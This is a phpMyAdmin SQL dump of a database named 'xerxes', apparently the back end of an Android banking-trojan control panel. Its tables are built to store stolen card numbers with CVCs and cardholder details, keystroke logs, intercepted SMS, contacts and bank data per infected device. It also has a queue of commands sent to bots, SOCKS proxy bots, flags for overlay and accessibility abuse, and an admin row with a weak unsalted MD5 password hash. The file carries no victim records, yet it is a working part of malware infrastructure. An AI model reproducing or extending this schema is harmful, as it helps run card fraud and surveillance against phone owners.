-- phpMyAdmin SQL Dump
-- version 4.2.12deb2+deb8u3
-- http://www.phpmyadmin.net
--
-- Хост: localhost
-- Время создания: Ноя 06 2018 г., 07:22
-- Версия сервера: 5.5.62-0+deb8u1
-- Версия PHP: 5.6.38-0+deb8u1

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- База данных: `xerxes`
--

-- --------------------------------------------------------

--
-- Структура таблицы `admin_accounts`
--

CREATE TABLE IF NOT EXISTS `admin_accounts` (
`id` int(25) NOT NULL,
  `user_name` varchar(20) NOT NULL,
  `passwd` varchar(50) NOT NULL,
  `admin_type` varchar(10) NOT NULL
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;

--
-- Дамп данных таблицы `admin_accounts`
--

INSERT INTO `admin_accounts` (`id`, `user_name`, `passwd`, `admin_type`) VALUES
(2, 'users', 'c4ca4238a0b923820dcc509a6f75849b', 'super');

-- --------------------------------------------------------

--
-- Структура таблицы `banks`
--

CREATE TABLE IF NOT EXISTS `banks` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `data` text,
  `time` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `cc_info`
--

CREATE TABLE IF NOT EXISTS `cc_info` (
`id` int(11) unsigned NOT NULL,
  `IMEI` text NOT NULL,
  `CARD` text NOT NULL,
  `typeCard` text,
  `MMYY` text,
  `CVC` text,
  `VBV` text,
  `CardholderName` text,
  `PhoneNumber` text,
  `birth_date` text,
  `zip_code` text,
  `holder_address` text,
  `last_update` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `clients`
--

CREATE TABLE IF NOT EXISTS `clients` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(300) NOT NULL,
  `number` varchar(300) DEFAULT NULL,
  `version` varchar(100) DEFAULT NULL,
  `version_apk` text,
  `country` varchar(30) DEFAULT NULL,
  `model` text,
  `apps` text,
  `lastConnect` int(11) DEFAULT NULL,
  `firstConnect` int(11) DEFAULT NULL,
  `root` varchar(50) DEFAULT NULL,
  `screen` varchar(50) DEFAULT NULL,
  `comment` text,
  `internet` text,
  `secret` text,
  `ip` text,
  `zip` text,
  `regionName` text,
  `city` text,
  `s_bank` int(11) DEFAULT '0',
  `s_card` int(11) DEFAULT '0',
  `s_sms` int(11) DEFAULT '0',
  `s_log` int(11) DEFAULT '0',
  `s_a7inj_enabled` int(11) DEFAULT '0',
  `s_whitelist` int(11) DEFAULT '0',
  `s_sms_manager` int(11) DEFAULT '0',
  `s_accessibility` int(11) DEFAULT '0',
  `s_overlay` int(11) DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `commands`
--

CREATE TABLE IF NOT EXISTS `commands` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `command` varchar(2000) NOT NULL,
  `command_name` text
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `contacts`
--

CREATE TABLE IF NOT EXISTS `contacts` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `number` varchar(60) DEFAULT NULL,
  `name` varchar(60) DEFAULT NULL,
  `country` varchar(60) DEFAULT NULL,
  `time` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `guests`
--

CREATE TABLE IF NOT EXISTS `guests` (
`id` int(11) NOT NULL,
  `name` text NOT NULL,
  `filter` text NOT NULL,
  `secret` text NOT NULL,
  `link` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `info`
--

CREATE TABLE IF NOT EXISTS `info` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `name` varchar(60) DEFAULT NULL,
  `hash` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `keylogs`
--

CREATE TABLE IF NOT EXISTS `keylogs` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `locked_clients`
--

CREATE TABLE IF NOT EXISTS `locked_clients` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(300) NOT NULL,
  `version` varchar(100) DEFAULT NULL,
  `country` varchar(30) DEFAULT NULL,
  `client_id` text,
  `secret` text,
  `lastConnect` int(11) DEFAULT NULL,
  `firstConnect` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `logs`
--

CREATE TABLE IF NOT EXISTS `logs` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `proxy_servers`
--

CREATE TABLE IF NOT EXISTS `proxy_servers` (
`id` int(11) NOT NULL,
  `ip` text NOT NULL,
  `user` text NOT NULL,
  `pass` text NOT NULL,
  `forward_user` text NOT NULL,
  `forward_pass` text NOT NULL,
  `root` int(11) NOT NULL,
  `time` int(11) NOT NULL,
  `country` text NOT NULL,
  `note` text NOT NULL,
  `status` int(11) NOT NULL,
  `status_text` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `sms`
--

CREATE TABLE IF NOT EXISTS `sms` (
`id` int(255) unsigned NOT NULL,
  `imei` varchar(60) NOT NULL,
  `time` int(11) DEFAULT NULL,
  `text` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Структура таблицы `socks`
--

CREATE TABLE IF NOT EXISTS `socks` (
`id` int(11) NOT NULL,
  `imei` text NOT NULL,
  `bot_country` text NOT NULL,
  `server` int(11) NOT NULL,
  `port` int(11) NOT NULL,
  `connect_time` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Индексы сохранённых таблиц
--

--
-- Индексы таблицы `admin_accounts`
--
ALTER TABLE `admin_accounts`
 ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `banks`
--
ALTER TABLE `banks`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `cc_info`
--
ALTER TABLE `cc_info`
 ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `clients`
--
ALTER TABLE `clients`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `commands`
--
ALTER TABLE `commands`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `contacts`
--
ALTER TABLE `contacts`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `guests`
--
ALTER TABLE `guests`
 ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `info`
--
ALTER TABLE `info`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `keylogs`
--
ALTER TABLE `keylogs`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `locked_clients`
--
ALTER TABLE `locked_clients`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `logs`
--
ALTER TABLE `logs`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `proxy_servers`
--
ALTER TABLE `proxy_servers`
 ADD PRIMARY KEY (`id`);

--
-- Индексы таблицы `sms`
--
ALTER TABLE `sms`
 ADD PRIMARY KEY (`id`), ADD KEY `id` (`id`);

--
-- Индексы таблицы `socks`
--
ALTER TABLE `socks`
 ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT для сохранённых таблиц
--

--
-- AUTO_INCREMENT для таблицы `admin_accounts`
--
ALTER TABLE `admin_accounts`
MODIFY `id` int(25) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=7;
--
-- AUTO_INCREMENT для таблицы `banks`
--
ALTER TABLE `banks`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `cc_info`
--
ALTER TABLE `cc_info`
MODIFY `id` int(11) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `clients`
--
ALTER TABLE `clients`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `commands`
--
ALTER TABLE `commands`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `contacts`
--
ALTER TABLE `contacts`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `guests`
--
ALTER TABLE `guests`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `info`
--
ALTER TABLE `info`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `keylogs`
--
ALTER TABLE `keylogs`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `locked_clients`
--
ALTER TABLE `locked_clients`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `logs`
--
ALTER TABLE `logs`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `proxy_servers`
--
ALTER TABLE `proxy_servers`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `sms`
--
ALTER TABLE `sms`
MODIFY `id` int(255) unsigned NOT NULL AUTO_INCREMENT;
--
-- AUTO_INCREMENT для таблицы `socks`
--
ALTER TABLE `socks`
MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
